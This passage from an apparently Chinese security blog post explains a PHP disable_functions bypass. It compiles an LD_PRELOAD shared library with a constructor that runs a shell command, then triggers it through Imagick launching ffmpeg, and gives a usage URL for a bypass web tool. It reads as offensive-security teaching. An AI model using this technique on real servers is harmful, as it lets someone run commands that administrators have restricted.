<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">     unsetenv(&quot;LD_PRELOAD&quot;);  &#x2F;&#x2F;centos 上却无效</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>__attribute__ ((__constructor__))</code> 有如下说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&#39;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure>

<p>所以当我们最开始将 evil shared library load 上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们 rce 的目的.</p>
<p> 那么我们要找到一个什么样的函数才能满足我们的条件呢？ </p>
<p>​     php-imagick  </p>
<p><strong>readelf -Ws /usr/sbin/sendmail</strong></p>
<p>我们发现如下对应关系</p>
<p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png" alt="img"></a></p>
<p>我们发现当文件是 MPEG format 时，程序会调用’ffmpeg’ program 进行转换，而如下后缀都被认为成 MPEG format</p>
<p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png" alt="img"></a></p>
<p>我们测试一下.wmv</p>
<p>写出脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们测试一下</p>
<p> <code>strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve</code> 查看 Imagick () 是否启动新进程：</p>
<p><a href="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png!small" alt="image.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 25217] execve(&quot;&#x2F;bin&#x2F;sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;&#x2F;tmp&#x2F;magick-2&quot;...], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>可以发现的确成功启动了子进程，调用了 ffmpeg</p>
<p>但是如果 sky.wmv 文件不存在时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>则不会调用 ffmpeg</p>
<p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p>
<p>所以如果想利用 Imagick 新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p>
<p> payload &amp; attack</p>
<p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造 evil shared library 了</p>
<p>我们还是用之前的 sky.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编译一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure>

<p>测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# php sky.php</span><br><span class="line">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.old</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image &#96;&#x2F;tmp&#x2F;magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error&#x2F;blob.c&#x2F;OpenBlob&#x2F;2712 in &#x2F;root&#x2F;sky.php:3</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#x2F;root&#x2F;sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in &#x2F;root&#x2F;sky.php on line 3</span><br></pre></td></tr></table></figure>

<p>我们成功的进行了列目录</p>
<h5 id="unsetenv-centos-上无效"><a href="#unsetenv-centos-上无效" class="headerlink" title="unsetenv   centos 上无效"></a>unsetenv   centos 上无效</h5><p> <code>https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p> 一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），在页面上显示，其他该参数，你应注意 web 是否有读写权限，网站是否可以跨目录访问，文件将被覆盖和删除等内容；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外，该 bypass_disablefunc.php 分解命令和输出路径成为完整的命令行，所以您不用在 cmd 参数中重新设置。 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/29/rce/" data-id="clmvmvony00121s7kdm0m5ftf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/11/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          php反序列化
        
      </div>
    </a>
  
  
    <a href="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">sql注入</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Coppersmith/" rel="tag">Coppersmith</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GraphiQL/" rel="tag">GraphiQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rsa/" rel="tag">rsa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sage/" rel="tag">sage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unctf/" rel="tag">unctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" rel="tag">大统一场理论</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Coppersmith/" style="font-size: 10px;">Coppersmith</a> <a href="/tags/GraphiQL/" style="font-size: 10px;">GraphiQL</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">php伪协议</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/sage/" style="font-size: 10px;">sage</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/unctf/" style="font-size: 10px;">unctf</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" style="font-size: 10px;">大统一场理论</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 20px;">密码学</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">文件读取</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/24/%E5%89%8D%E7%AB%AF/">前端</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E6%89%94%E5%87%BA%E5%8E%BB%E7%9A%84%E9%83%A8%E5%88%86/">扔出去的部分</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E4%B8%96%E7%95%8C%E8%A7%82/">世界观</a>
          </li>
        
          <li>
            <a href="/2022/10/01/%E6%9D%82/">杂</a>
          </li>
        
          <li>
            <a href="/2021/05/15/%E7%BD%91%E6%96%87/">网文</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 zhiliya<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>